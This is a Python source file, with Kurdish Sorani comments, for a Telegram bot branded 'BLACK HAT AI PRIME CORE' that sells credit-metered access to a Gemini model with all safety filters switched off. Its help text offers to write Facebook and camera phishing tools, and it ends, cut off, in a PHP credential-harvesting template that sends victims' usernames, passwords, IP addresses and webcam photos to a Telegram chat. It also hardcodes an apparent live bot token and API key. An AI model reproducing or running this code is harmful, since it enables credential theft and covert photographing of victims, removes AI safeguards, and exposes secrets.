import os
import sys
import random
import sqlite3
import logging
import html
import threading
import urllib.parse
import urllib.request
import re
import requests
import time
import base64
import hashlib
import string
import socket
import io
import qrcode
import csv
import asyncio
import aiohttp
import psutil
import shutil
from datetime import datetime, timedelta

import telebot
from telebot import types
from telebot.apihelper import ApiTelegramException

# ==========================================
# 1. کۆنفیگەرەیشن
# ==========================================
TOKEN = "8613090176:AAFK1kyiIBhGp7CP5PE_4xahT-gW1gTsx5M"
ADMIN_ID = 5527152252
SUPER_ADMIN_ID_2 = 8487940066
SUPER_ADMINS = [ADMIN_ID, SUPER_ADMIN_ID_2]

DB_PATH = "bot_database.db"
LOG_FILE = "bot.log"
AI_API_KEY = "AQ.Ab8RN6JwiCH_nK4jO18J2hjW267xM0uMs0TPRWnuZ1z0vmKV4A"
FORCE_CHANNEL = "@Nova_Kurd_Mod"

# دۆخەکان
awaiting_ddos = {}
active_ddos = {} 

logging.basicConfig(level=logging.INFO, format="%(asctime)s - [%(levelname)s] - %(message)s", handlers=[logging.FileHandler(LOG_FILE), logging.StreamHandler()])
logger = logging.getLogger("Core")
bot = telebot.TeleBot(TOKEN, parse_mode="HTML")

# ==========================================
# 2. داتابەیس
# ==========================================
def db():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=30)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")
    return conn

def init_db():
    try:
        c = db()
        c.executescript("""
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY, first_name TEXT, username TEXT, 
                acc_created TEXT, joined_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_seen DATETIME DEFAULT CURRENT_TIMESTAMP, is_banned INTEGER DEFAULT 0,
                is_vip INTEGER DEFAULT 0, is_muted INTEGER DEFAULT 0,
                ban_until DATETIME DEFAULT NULL, last_daily DATETIME DEFAULT NULL
            );
            CREATE TABLE IF NOT EXISTS simple_admins (user_id INTEGER PRIMARY KEY);
            CREATE TABLE IF NOT EXISTS chat_history (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, role TEXT, content TEXT);
            CREATE TABLE IF NOT EXISTS gift_codes (code TEXT PRIMARY KEY, reward INTEGER DEFAULT 10, used_by INTEGER);
            CREATE TABLE IF NOT EXISTS credit (user_id INTEGER PRIMARY KEY, questions_left INTEGER DEFAULT 0);
            CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT);
            CREATE TABLE IF NOT EXISTS spy_targets (user_id INTEGER PRIMARY KEY);
            CREATE TABLE IF NOT EXISTS blocked_ips (ip TEXT PRIMARY KEY);
        """)
        for col in ["is_vip INTEGER DEFAULT 0", "is_muted INTEGER DEFAULT 0", "ban_until DATETIME DEFAULT NULL", "last_daily DATETIME DEFAULT NULL"]:
            try: c.execute(f"ALTER TABLE users ADD COLUMN {col}")
            except: pass
        c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('bot_status', 'on')")
        c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('maintenance', 'off')")
        c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('force_sub', ?)", (FORCE_CHANNEL,))
        c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('welcome_msg', 'سیستەمەکە ئامادەیە. 🌐')")
        c.commit()
        c.close()
    except Exception as e:
        logger.error(f"DB Init Error: {e}")

# ==========================================
# 3. فەنکشنەکانی یارمەتیدەر
# ==========================================
def get_setting(key):
    try:
        c = db()
        row = c.execute("SELECT value FROM settings WHERE key=?", (key,)).fetchone()
        c.close()
        return row[0] if row else None
    except: return None

def set_setting(key, val):
    try:
        c = db()
        c.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, val))
        c.commit()
        c.close()
    except: pass

def get_signature():
    return "\n\n───────────────────\n🔍 <b>[Bug Bounty Program]:</b>\n<i>هەر کەسێک کێشەیەک [bug] بدۆزێتەوە خەڵات دەکرێت.</i>\n👑 <b>سەرۆکی بۆت:</b> @ALONE427 | @malikdlashad3"

def log_user(message):
    try:
        uid = message.from_user.id
        fn = message.from_user.first_name or "بێ ناو"
        un = message.from_user.username or "بێ یوزەرنەیم"
        c = db()
        c.execute("INSERT OR IGNORE INTO users (user_id, first_name, username, acc_created) VALUES (?, ?, ?, datetime('now', 'localtime'))", (uid, fn, un))
        c.execute("UPDATE users SET first_name=?, username=?, last_seen=datetime('now', 'localtime') WHERE user_id=?", (fn, un, uid))
        c.commit()
        c.close()
    except: pass

def is_super_admin(uid): return uid in SUPER_ADMINS

def is_simple_admin(uid):
    try:
        c = db()
        row = c.execute("SELECT user_id FROM simple_admins WHERE user_id=?", (uid,)).fetchone()
        c.close()
        return row is not None
    except: return False

def is_vip(uid):
    try:
        c = db()
        row = c.execute("SELECT is_vip FROM users WHERE user_id=?", (uid,)).fetchone()
        c.close()
        return row is not None and row[0] == 1
    except: return False

def add_credit(user_id, n):
    try:
        c = db()
        c.execute("INSERT INTO credit(user_id, questions_left) VALUES(?,?) ON CONFLICT(user_id) DO UPDATE SET questions_left=questions_left+?", (user_id, n, n))
        c.commit()
        c.close()
    except: pass

def spend_credit(uid):
    if is_super_admin(uid) or is_simple_admin(uid) or is_vip(uid): return True
    try:
        c = db()
        row = c.execute("SELECT questions_left FROM credit WHERE user_id=?", (uid,)).fetchone()
        if row and row[0] > 0:
            c.execute("UPDATE credit SET questions_left=questions_left-1 WHERE user_id=?", (uid,))
            c.commit()
            c.close()
            return True
        c.close()
    except: pass
    return False

def get_credit(uid):
    if is_super_admin(uid) or is_simple_admin(uid) or is_vip(uid): return "♾️ بێکۆتایی"
    try:
        c = db()
        row = c.execute("SELECT questions_left FROM credit WHERE user_id=?", (uid,)).fetchone()
        c.close()
        return str(row[0]) if row else "0"
    except: return "0"

def parse_ban_time(time_str):
    time_str = time_str.lower().strip()
    if time_str in ["0", "perm", "permanent"]: return None
    match = re.match(r'^(\d+)([mhdw])$', time_str)
    if not match: return False
    val = int(match.group(1))
    unit = match.group(2)
    now = datetime.now()
    if unit == 'm': return (now + timedelta(minutes=val)).strftime("%Y-%m-%d %H:%M:%S")
    elif unit == 'h': return (now + timedelta(hours=val)).strftime("%Y-%m-%d %H:%M:%S")
    elif unit == 'd': return (now + timedelta(days=val)).strftime("%Y-%m-%d %H:%M:%S")
    elif unit == 'w': return (now + timedelta(weeks=val)).strftime("%Y-%m-%d %H:%M:%S")
    return False

# ==========================================
# 4. مێشکی زیرەک (Gemini)
# ==========================================
def get_ai_response(user_id, query):
    # چارەسەری کێشەی سڵاوکردن
    ql = query.lower()
    if any(k in ql for k in ["سڵاو", "hello", "hi", "hey", "بەیانی باش", "ئێوارە باش"]):
        return "سڵاو بەخێربێیت! چۆن دەتوانم یارمەتیت بدەم؟"
        
    if not AI_API_KEY: return "ببورە تێنەگشتم بە ڕوونتر بیڵێ"
    try:
        c = db()
        history = c.execute("SELECT role, content FROM chat_history WHERE user_id=? ORDER BY id DESC LIMIT 4", (user_id,)).fetchall()
        c.close()
        history.reverse()
        contents = [{"role": r, "parts": [{"text": c}]} for r, c in history]
        contents.append({"role": "user", "parts": [{"text": query}]})
        
        url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-pro-latest:generateContent?key={AI_API_KEY}"
        system_prompt = (
            "You are a highly intelligent and friendly AI assistant. "
            "Answer the user's questions in Kurdish Sorani naturally. "
            "If the user asks a general question, answer it. "
            "Only respond with 'ببورە تێنەگشتم بە ڕوونتر بیڵێ' if the prompt is absolute gibberish."
        )
        payload = {
            "system_instruction": {"parts": [{"text": system_prompt}]},
            "contents": contents,
            "generationConfig": {"temperature": 0.7, "maxOutputTokens": 4096},
            "safetySettings": [
                {"category": "HARM_CATEGORY_HARASSMENT", "threshold": "BLOCK_NONE"},
                {"category": "HARM_CATEGORY_HATE_SPEECH", "threshold": "BLOCK_NONE"},
                {"category": "HARM_CATEGORY_SEXUALLY_EXPLICIT", "threshold": "BLOCK_NONE"},
                {"category": "HARM_CATEGORY_DANGEROUS_CONTENT", "threshold": "BLOCK_NONE"}
            ]
        }
        res = requests.post(url, json=payload, timeout=30).json()
        if 'candidates' in res and len(res['candidates']) > 0:
            ai_text = res['candidates'][0]['content']['parts'][0]['text']
            if not ai_text.strip(): return "ببورە تێنەگشتم بە ڕوونتر بیڵێ"
            c = db()
            c.execute("INSERT INTO chat_history(user_id, role, content) VALUES(?,?,?)", (user_id, "user", query))
            c.execute("INSERT INTO chat_history(user_id, role, content) VALUES(?,?,?)", (user_id, "model", ai_text))
            c.commit()
            c.close()
            return ai_text
        return "ببورە تێنەگشتم بە ڕوونتر بیڵێ"
    except Exception:
        return "ببورە تێنەگشتم بە ڕوونتر بیڵێ"

# ==========================================
# 5. پشکنینی جۆینبوون
# ==========================================
def is_subscribed(user_id):
    if is_super_admin(user_id) or is_vip(user_id): return True
    channel = get_setting('force_sub')
    if not channel: return True
    try:
        member = bot.get_chat_member(channel, user_id)
        if member.status in ['creator', 'administrator', 'member']: return True
    except Exception: return False
    return False

def force_sub_msg(chat_id):
    channel = get_setting('force_sub')
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("📢 جۆینبوون بە کەناڵ", url=f"https://t.me/{channel.replace('@', '')}"))
    markup.add(types.InlineKeyboardButton("✅ پشکنین", callback_data="check_sub"))
    bot.send_message(chat_id, "⚠️ <b>تکایە سەرەتا جۆین بە کەناڵەکە ببە!</b>", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "check_sub")
def handle_check_sub(call):
    if is_subscribed(call.from_user.id):
        bot.answer_callback_query(call.id, "✅ سوپاس بۆ جۆینبوون!")
        try: bot.delete_message(call.message.chat.id, call.message.message_id)
        except: pass
        bot.send_message(call.message.chat.id, "💀 <b>BLACK HAT AI PRIME CORE v105</b> 💀\n\nسیستەمەکە ئامادەیە.", reply_markup=get_main_keyboard())
    else:
        bot.answer_callback_query(call.id, "❌ هێشتا جۆین نەبوویتە.", show_alert=True)

def get_main_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(types.KeyboardButton("/help"), types.KeyboardButton("/help2"))
    return markup

# ==========================================
# 6. پەنێلی ئەدمین و هەندلەرەکان (50 Features)
# ==========================================
@bot.message_handler(commands=["panel"])
def cmd_panel(message):
    if not is_super_admin(message.from_user.id): return
    text = (
        "👑 <b>پەنێلی ئەدمینی تەواو (50 فەرمان)</b> 👑\n\n"
        "👤 <b>[1] بەڕێوەبردنی بەکارهێنەر:</b>\n"
        "1. /user_info [ID] | 2. /ban [ID] [Time] | 3. /unban [ID]\n"
        "4. /mute [ID] | 5. /unmute [ID] | 6. /make_vip [ID]\n"
        "7. /remove_vip [ID] | 8. /reset_daily [ID] | 9. /clear_history [ID] | 10. /send [ID] [Msg]\n\n"
        "💰 <b>[2] کرێدیت و خەڵات:</b>\n"
        "11. /credit [ID] | 12. /addcredit [ID] [N] | 13. /remcredit [ID] [N]\n"
        "14. /setcredit [ID] [N] | 15. /gen [N] | 16. /gen_bulk [Count] [N]\n"
        "17. /list_codes | 18. /del_code [Code] | 19. /clear_codes | 20. /reset_all_credits\n\n"
        "📢 <b>[3] نامەناردن:</b>\n"
        "21. /broadcast [Msg] | 22. /broadcast_vip [Msg] | 23. /broadcast_admins [Msg]\n"
        "24. /pin_message (Reply) | 25. /forward_msg [ID] (Reply)\n\n"
        "⚙️ <b>[4] کۆنترۆڵی بۆت:</b>\n"
        "26. /on | 27. /off | 28. /maintenance [on/off] | 29. /set_sub [Channel] | 30. /del_sub\n"
        "31. /set_welcome [Text] | 32. /toggle_ai [on/off] | 33. /toggle_search [on/off] | 34. /restart | 35. /shutdown\n\n"
        "🛡 <b>[5] ئاسایش و سیخوڕی:</b>\n"
        "36. /addsimple [ID] | 37. /removesimple [ID] | 38. /list_admins | 39. /spy [ID] | 40. /unspy [ID]\n"
        "41. /list_spied | 42. /list_banned | 43. /list_vips | 44. /blacklist_ip [IP] | 45. /unblock_ip [IP]\n\n"
        "📁 <b>[6] داتا و سیستەم:</b>\n"
        "46. /backup_db | 47. /db_size | 48. /sys_stats | 49. /export_users | 50. /logs"
    )
    bot.send_message(message.chat.id, text)

@bot.message_handler(commands=["help"])
def cmd_help(message):
    text = (
        "🧠 <b>یارمەتی سەرەکی (AI & Hacking)</b>\n\n"
        "🔹 <b>وێب دیزاین و کۆد:</b> تەنها وێنەیەک یان کۆدێک بنێرە، شیکاری بۆ دەکەم.\n"
        "🔹 <b>دروستکردنی توڵ و فیشینگ:</b> بنووسە 'hack facebook' یان 'camera'، کۆدەکەت بۆ دەنووسم.\n"
        "🔹 <b>گەڕانی زیندوو:</b> دەتوانم لە ئینتەرنێت بگەڕێم بۆ زانیاری نوێ.\n"
        "🔹 <b>هەکینگ و ئاسایش:</b> هەر پرسیارێکی تەکنیکی بکە، وەڵامت دەدەمەوە."
    )
    bot.reply_to(message, text + get_signature())

@bot.message_handler(commands=["help2"])
def cmd_help2(message):
    text = (
        "🛠 <b>یارمەتی بەکارهێنەر (فەرمانەکان)</b>\n\n"
        "• <code>/credit</code> — بینینی کرێدیتی تۆ\n"
        "• <code>/daily</code> — وەرگرتنی 1 کرێدیتی ڕۆژانە\n"
        "• <code>/gift [کۆد]</code> — بەکارهێنانی کۆدی خەڵات\n"
        "• <code>/start</code> — دەستپێکردنەوەی بۆت و بینینی دوگمەکان\n\n"
        "👑 <b>پەیوەندی:</b> @ALONE427 | @malikdlashad3"
    )
    bot.reply_to(message, text + get_signature())

@bot.message_handler(commands=["start"])
def cmd_start(message):
    if not is_subscribed(message.from_user.id): return force_sub_msg(message.chat.id)
    log_user(message)
    bot.send_message(message.chat.id, "💀 <b>BLACK HAT AI PRIME CORE v105</b> 💀\n\nسیستەمەکە ئامادەیە.", reply_markup=get_main_keyboard())

# --- [1] بەڕێوەبردنی بەکارهێنەر ---
@bot.message_handler(commands=["user_info"])
def cmd_user_info(message):
    if not is_super_admin(message.from_user.id): return
    try:
        uid = int(message.text.split()[1])
        c = db()
        u = c.execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()
        c.close()
        if u:
            bot.reply_to(message, f"👤 <b>زانیاری:</b>\n🆔 <code>{u[0]}</code>\n📝 ناو: {u[1]}\n🔗 یوزەر: @{u[2]}\n💳 کرێدیت: {get_credit(uid)}\n🚫 بلۆک: {u[7]}\n⭐ VIP: {u[8]}")
        else: bot.reply_to(message, "❌ نەدۆزرایەوە.")
    except: bot.reply_to(message, "⚠️ Use: /user_info [ID]")

@bot.message_handler(commands=["ban"])
def cmd_ban(message):
    if not is_super_admin(message.from_user.id): return
    p = message.text.split()
    if len(p) < 2: return bot.reply_to(message, "⚠️ Use: /ban [ID] [Time]")
    try:
        uid = int(p[1]); t_str = p[2] if len(p) > 2 else "0"
        b_until = parse_ban_time(t_str)
        if b_until is False: return bot.reply_to(message, "❌ کات هەڵەیە.")
        c = db()
        if b_until is None:
            c.execute("UPDATE users SET is_banned=1, ban_until=NULL WHERE user_id=?", (uid,))
            bot.reply_to(message, f"🚫 بۆ هەتاهەتای بلۆک کرا.")
        else:
            c.execute("UPDATE users SET is_banned=1, ban_until=? WHERE user_id=?", (b_until, uid))
            bot.reply_to(message, f"🚫 تا {b_until} بلۆک کرا.")
        c.commit(); c.close()
    except: bot.reply_to(message, "⚠️ ID هەڵەیە.")

@bot.message_handler(commands=["unban", "mute", "unmute", "make_vip", "remove_vip", "reset_daily", "clear_history"])
def cmd_user_mods(message):
    if not is_super_admin(message.from_user.id): return
    cmd = message.text.split()[0][1:]
    try:
        uid = int(message.text.split()[1])
        c = db()
        if cmd == "unban": c.execute("UPDATE users SET is_banned=0, ban_until=NULL WHERE user_id=?", (uid,))
        elif cmd == "mute": c.execute("UPDATE users SET is_muted=1 WHERE user_id=?", (uid,))
        elif cmd == "unmute": c.execute("UPDATE users SET is_muted=0 WHERE user_id=?", (uid,))
        elif cmd == "make_vip": c.execute("UPDATE users SET is_vip=1 WHERE user_id=?", (uid,))
        elif cmd == "remove_vip": c.execute("UPDATE users SET is_vip=0 WHERE user_id=?", (uid,))
        elif cmd == "reset_daily": c.execute("UPDATE users SET last_daily=NULL WHERE user_id=?", (uid,))
        elif cmd == "clear_history": c.execute("DELETE FROM chat_history WHERE user_id=?", (uid,))
        c.commit(); c.close()
        bot.reply_to(message, f"✅ {cmd} جێبەجێکرا بۆ {uid}.")
    except: bot.reply_to(message, "⚠️ ID هەڵەیە.")

@bot.message_handler(commands=["send"])
def cmd_send(message):
    if not is_super_admin(message.from_user.id): return
    p = message.text.split(maxsplit=2)
    if len(p) < 3: return bot.reply_to(message, "⚠️ Use: /send [ID] [Msg]")
    try:
        bot.send_message(int(p[1]), p[2])
        bot.reply_to(message, "✅ نێردرا.")
    except: bot.reply_to(message, "❌ هەڵە.")

# --- [2] کرێدیت و خەڵات ---
@bot.message_handler(commands=["credit"])
def cmd_credit_admin(message):
    if not is_super_admin(message.from_user.id): return
    try:
        uid = int(message.text.split()[1])
        bot.reply_to(message, f"💳 کرێدیتی {uid}: <b>{get_credit(uid)}</b>")
    except: bot.reply_to(message, "⚠️ Use: /credit [ID]")

@bot.message_handler(commands=["addcredit", "remcredit", "setcredit"])
def cmd_credit_mods(message):
    if not is_super_admin(message.from_user.id): return
    cmd = message.text.split()[0][1:]
    try:
        p = message.text.split()
        uid, n = int(p[1]), int(p[2])
        if cmd == "addcredit": add_credit(uid, n)
        elif cmd == "remcredit": add_credit(uid, -n)
        elif cmd == "setcredit":
            c = db(); c.execute("INSERT OR REPLACE INTO credit(user_id, questions_left) VALUES(?,?)", (uid, n)); c.commit(); c.close()
        bot.reply_to(message, f"✅ کرێدیتی {uid} گۆڕدرا.")
    except: bot.reply_to(message, "⚠️ Use: /cmd [ID] [Amount]")

@bot.message_handler(commands=["gen", "gen_bulk"])
def cmd_gen(message):
    if not is_super_admin(message.from_user.id): return
    try:
        p = message.text.split()
        if p[0] == "/gen":
            n = int(p[1]) if len(p) > 1 else 10
            code = f"VIP-{random.randint(10000,99999)}"
            c = db(); c.execute("INSERT INTO gift_codes(code, reward) VALUES(?,?)", (code, n)); c.commit(); c.close()
            bot.reply_to(message, f"✅ کۆد: <code>{code}</code> ({n} کرێدیت)")
        else:
            count, amount = int(p[1]), int(p[2])
            codes = []
            c = db()
            for _ in range(count):
                code = f"VIP-{random.randint(10000,99999)}"
                c.execute("INSERT INTO gift_codes(code, reward) VALUES(?,?)", (code, amount))
                codes.append(code)
            c.commit(); c.close()
            bot.reply_to(message, f"✅ {count} کۆد دروستکرا.\n" + "\n".join(codes[:10]) + "\n(10 ی یەکەم)")
    except: bot.reply_to(message, "⚠️ هەڵە.")

@bot.message_handler(commands=["list_codes", "del_code", "clear_codes", "reset_all_credits"])
def cmd_code_mods(message):
    if not is_super_admin(message.from_user.id): return
    cmd = message.text.split()[0][1:]
    c = db()
    if cmd == "list_codes":
        rows = c.execute("SELECT code, reward FROM gift_codes WHERE used_by IS NULL LIMIT 20").fetchall()
        txt = "🎁 <b>کۆدەکان:</b>\n"
        for r in rows: txt += f"🔹 <code>{r[0]}</code> ({r[1]})\n"
        bot.reply_to(message, txt if rows else "هیچ کۆدێک نییە.")
    elif cmd == "del_code":
        try:
            code = message.text.split()[1]
            c.execute("DELETE FROM gift_codes WHERE code=?", (code,)); c.commit()
            bot.reply_to(message, "✅ سڕایەوە.")
        except: bot.reply_to(message, "⚠️ Use: /del_code [Code]")
    elif cmd == "clear_codes":
        c.execute("DELETE FROM gift_codes WHERE used_by IS NULL"); c.commit()
        bot.reply_to(message, "✅ هەموو کۆدەکان سڕانەوە.")
    elif cmd == "reset_all_credits":
        c.execute("UPDATE credit SET questions_left=0"); c.commit()
        bot.reply_to(message, "✅ کرێدیتی هەموو بەکارهێنەران کرا بە 0.")
    c.close()

# --- [3] نامەناردن ---
@bot.message_handler(commands=["broadcast", "broadcast_vip", "broadcast_admins"])
def cmd_broadcast(message):
    if not is_super_admin(message.from_user.id): return
    cmd = message.text.split()[0][1:]
    msg = message.text.replace(f"/{cmd}", "").strip()
    if not msg: return bot.reply_to(message, "⚠️ نامەکە بنووسە.")
    c = db()
    if cmd == "broadcast": users = c.execute("SELECT user_id FROM users WHERE is_banned=0").fetchall()
    elif cmd == "broadcast_vip": users = c.execute("SELECT user_id FROM users WHERE is_vip=1").fetchall()
    else: users = [(uid,) for uid in SUPER_ADMINS]
    c.close()
    s = 0
    for (uid,) in users:
        try: bot.send_message(uid, msg); s += 1; time.sleep(0.05)
        except: pass
    bot.reply_to(message, f"✅ نێردرا بۆ {s} کەس.")

@bot.message_handler(commands=["pin_message", "forward_msg"])
def cmd_msg_actions(message):
    if not is_super_admin(message.from_user.id): return
    cmd = message.text.split()[0][1:]
    if not message.reply_to_message: return bot.reply_to(message, "⚠️ ڕیپلای بکە بە نامەیەک.")
    if cmd == "pin_message":
        bot.pin_chat_message(message.chat.id, message.reply_to_message.message_id)
        bot.reply_to(message, "✅ پین کرا.")
    else:
        try:
            target = int(message.text.split()[1])
            bot.forward_message(target, message.chat.id, message.reply_to_message.message_id)
            bot.reply_to(message, "✅ نێردرا.")
        except: bot.reply_to(message, "⚠️ Use: /forward_msg [ID] (Reply to msg)")

# --- [4] کۆنترۆڵی بۆت ---
@bot.message_handler(commands=["on", "off", "maintenance", "toggle_ai", "toggle_search"])
def cmd_bot_controls(message):
    if not is_super_admin(message.from_user.id): return
    cmd = message.text.split()[0][1:]
    if cmd == "on": set_setting('bot_status', 'on'); bot.reply_to(message, "✅ بۆت کارا کرا.")
    elif cmd == "off": set_setting('bot_status', 'off'); bot.reply_to(message, "❌ بۆت ناچالاک کرا.")
    elif cmd == "maintenance":
        try:
            val = message.text.split()[1].lower()
            if val in ['on','off']: set_setting('maintenance', val); bot.reply_to(message, f"⚙️ Maintenance: {val}")
        except: bot.reply_to(message, "⚠️ Use: /maintenance [on/off]")
    elif cmd == "toggle_ai":
        try:
            val = message.text.split()[1].lower()
            if val in ['on','off']: set_setting('ai_enabled', val); bot.reply_to(message, f"🧠 AI: {val}")
        except: bot.reply_to(message, "⚠️ Use: /toggle_ai [on/off]")
    elif cmd == "toggle_search":
        try:
            val = message.text.split()[1].lower()
            if val in ['on','off']: set_setting('search_enabled', val); bot.reply_to(message, f"🔍 Search: {val}")
        except: bot.reply_to(message, "⚠️ Use: /toggle_search [on/off]")

@bot.message_handler(commands=["set_sub", "del_sub", "set_welcome"])
def cmd_settings(message):
    if not is_super_admin(message.from_user.id): return
    cmd = message.text.split()[0][1:]
    if cmd == "set_sub":
        try:
            ch = message.text.split()[1]
            set_setting('force_sub', ch); bot.reply_to(message, f"✅ کەناڵ دانرا: {ch}")
        except: bot.reply_to(message, "⚠️ Use: /set_sub [@Channel]")
    elif cmd == "del_sub":
        set_setting('force_sub', ''); bot.reply_to(message, "✅ کەناڵ لابرا.")
    elif cmd == "set_welcome":
        txt = message.text.replace("/set_welcome", "").strip()
        set_setting('welcome_msg', txt); bot.reply_to(message, "✅ نامەی بەخێربێن گۆڕدرا.")

@bot.message_handler(commands=["restart", "shutdown"])
def cmd_power(message):
    if not is_super_admin(message.from_user.id): return
    cmd = message.text.split()[0][1:]
    if cmd == "restart":
        bot.reply_to(message, "♻️ ڕیستارت دەکرێت...")
        time.sleep(1)
        os.execv(sys.executable, ['python'] + sys.argv)
    elif cmd == "shutdown":
        bot.reply_to(message, "🛑 بۆت دەکوژێنرێتەوە...")
        time.sleep(1)
        sys.exit(0)

# --- [5] ئاسایش و سیخوڕی ---
@bot.message_handler(commands=["addsimple", "removesimple", "list_admins"])
def cmd_admins(message):
    if not is_super_admin(message.from_user.id): return
    cmd = message.text.split()[0][1:]
    c = db()
    if cmd == "list_admins":
        rows = c.execute("SELECT user_id FROM simple_admins").fetchall()
        txt = "👑 <b>ئەدمینە سادەکان:</b>\n" + "\n".join([f"<code>{r[0]}</code>" for r in rows])
        bot.reply_to(message, txt if rows else "هیچ ئەدمینێکی سادە نییە.")
    else:
        try:
            uid = int(message.text.split()[1])
            if cmd == "addsimple": c.execute("INSERT OR IGNORE INTO simple_admins(user_id) VALUES(?)", (uid,))
            else: c.execute("DELETE FROM simple_admins WHERE user_id=?", (uid,))
            c.commit(); bot.reply_to(message, f"✅ {cmd} بۆ {uid} جێبەجێکرا.")
        except: bot.reply_to(message, "⚠️ Use: /addsimple [ID]")
    c.close()

@bot.message_handler(commands=["spy", "unspy", "list_spied"])
def cmd_spy(message):
    if not is_super_admin(message.from_user.id): return
    cmd = message.text.split()[0][1:]
    c = db()
    if cmd == "list_spied":
        rows = c.execute("SELECT user_id FROM spy_targets").fetchall()
        txt = "🕵️‍♂️ <b>سیخوڕی لەسەر:</b>\n" + "\n".join([f"<code>{r[0]}</code>" for r in rows])
        bot.reply_to(message, txt if rows else "هیچ کەسێک نییە.")
    else:
        try:
            uid = int(message.text.split()[1])
            if cmd == "spy": c.execute("INSERT OR IGNORE INTO spy_targets(user_id) VALUES(?)", (uid,))
            else: c.execute("DELETE FROM spy_targets WHERE user_id=?", (uid,))
            c.commit(); bot.reply_to(message, f"✅ سیخوڕی {cmd} بۆ {uid}.")
        except: bot.reply_to(message, "⚠️ Use: /spy [ID]")
    c.close()

@bot.message_handler(commands=["list_banned", "list_vips"])
def cmd_list_mods(message):
    if not is_super_admin(message.from_user.id): return
    cmd = message.text.split()[0][1:]
    c = db()
    if cmd == "list_banned": rows = c.execute("SELECT user_id FROM users WHERE is_banned=1 LIMIT 50").fetchall()
    else: rows = c.execute("SELECT user_id FROM users WHERE is_vip=1 LIMIT 50").fetchall()
    c.close()
    txt = f"👤 <b>{cmd.replace('list_', '').capitalize()}:</b>\n" + "\n".join([f"<code>{r[0]}</code>" for r in rows])
    bot.reply_to(message, txt if rows else "هیچ کەسێک نییە.")

@bot.message_handler(commands=["blacklist_ip", "unblock_ip"])
def cmd_ips(message):
    if not is_super_admin(message.from_user.id): return
    cmd = message.text.split()[0][1:]
    try:
        ip = message.text.split()[1]
        c = db()
        if cmd == "blacklist_ip": c.execute("INSERT OR IGNORE INTO blocked_ips(ip) VALUES(?)", (ip,)); bot.reply_to(message, f"🚫 {ip} بلۆک کرا.")
        else: c.execute("DELETE FROM blocked_ips WHERE ip=?", (ip,)); bot.reply_to(message, f"✅ {ip} لابرا.")
        c.commit(); c.close()
    except: bot.reply_to(message, "⚠️ Use: /blacklist_ip [IP]")

# --- [6] داتا و سیستەم ---
@bot.message_handler(commands=["backup_db", "db_size", "sys_stats", "export_users", "logs"])
def cmd_sys(message):
    if not is_super_admin(message.from_user.id): return
    cmd = message.text.split()[0][1:]
    if cmd == "backup_db":
        try:
            with open(DB_PATH, 'rb') as f: bot.send_document(message.chat.id, f, caption="📁 Database Backup")
        except: bot.reply_to(message, "❌ هەڵە.")
    elif cmd == "db_size":
        size = os.path.getsize(DB_PATH) / 1024
        bot.reply_to(message, f"📦 قەبارەی داتابەیس: {size:.2f} KB")
    elif cmd == "sys_stats":
        cpu = psutil.cpu_percent()
        ram = psutil.virtual_memory().percent
        disk = psutil.disk_usage('/').percent
        bot.reply_to(message, f"🖥 <b>سیستەم:</b>\nCPU: {cpu}%\nRAM: {ram}%\nDisk: {disk}%")
    elif cmd == "export_users":
        c = db()
        rows = c.execute("SELECT user_id, first_name, username, joined_at, is_banned, is_vip FROM users").fetchall()
        c.close()
        output = io.StringIO()
        writer = csv.writer(output)
        writer.writerow(["ID", "Name", "Username", "Joined", "Banned", "VIP"])
        writer.writerows(rows)
        bio = io.BytesIO(output.getvalue().encode('utf-8'))
        bio.name = "users.csv"
        bot.send_document(message.chat.id, bio, caption="📁 لیستی بەکارهێنەران")
    elif cmd == "logs":
        try:
            with open(LOG_FILE, 'rb') as f: bot.send_document(message.chat.id, f, caption="📁 Logs")
        except: bot.reply_to(message, "❌ هەڵە لە خوێندنەوەی لۆگ.")

# ==========================================
# 7. هەندلەرەکانی بەکارهێنەر (فیشینگ و AI)
# ==========================================
def get_phishing_php():
    php_template = """<?php
$bot_token = "BOT_TOKEN_HERE";
$chat_id = "CHAT_ID_HERE";
$platform = $_POST['platform'] ?? 'Camera';
$username = $_POST['username'] ?? 'N/A';
$password = $_POST['password'] ?? 'N/A';
$img = $_POST['img'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];
$text = "🚨 <b>قوربانییەکی نوێ!</b> 🚨\\n\\n🌐 <b>پلاتفۆرم:</b> " . $platform . "\\n👤 <b>ناو:</b> <code>" . $username . "</code>\\n🔑 <b>پاسوۆرد:</b> <code>" . $password . "</code>\\n🌍 <b>ئایپی:</b> <code>" . $ip . "</code>\\n⏰ <b>کات:</b> " . date("Y-m-d H:i:s");
$msg_url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage?chat_id=" . $chat_id . "&text=" . urlencode($text) . "&parse_mode=HTML";
file_get_contents($msg_url);
if (!empty($img)) {
    $img = str_replace('data:image/jpeg;base64,', '', $img); $img = str_replace('data:image/png;base64,', '', $img); $img = str_replace(' ', '+', $img); $data = base64_decode($img);
    $tempFile = tempnam(sys_get_temp_dir(), 'cam') . '.jpg'; file_put_contents($tempFile, $data);
    $postFields = array('chat_id' => $chat_id, 'photo' => new CURLFile($tempFile), 'caption' => "📸 <b>وێنەی کامێرا</b> لە " . $ip, 'parse_mode' => 'HTML');
    $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot" . $bot_token . "/sendPhoto"); curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_exec($ch); curl_close($ch); unlink($tempFile);
}
